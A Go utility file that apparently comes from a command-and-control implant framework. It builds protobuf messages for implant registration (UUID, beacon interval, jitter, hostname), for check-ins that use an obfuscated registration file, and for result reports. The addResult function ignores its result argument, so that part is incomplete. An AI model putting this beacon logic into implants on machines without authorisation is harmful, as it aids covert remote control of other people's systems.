package utils

import (
	"github.com/degenerat3/meteor/meteor/pbuf"
	"github.com/golang/protobuf/proto"
	goUUID "github.com/google/uuid"
)

func genRegister(interval int, delta int, hostname string) []byte {
	uuid := goUUID.New().String()
	pro := &mcs.MCS{
		Uuid:     uuid,
		Interval: int32(interval),
		Delta:    int32(delta),
		Hostname: hostname,
	}
	data, _ := proto.Marshal(pro)
	return data
}

func genCheckin(regFile string, obfText string) []byte {
	uuid := fetchUUID(regFile, obfText)
	pro := &mcs.MCS{
		Uuid: uuid,
	}
	data, _ := proto.Marshal(pro)
	return data
}

func addResult(uuid string, result string) []byte {
	pro := &mcs.MCS{
		Uuid: uuid,
	}
	data, _ := proto.Marshal(pro)
	return data
}
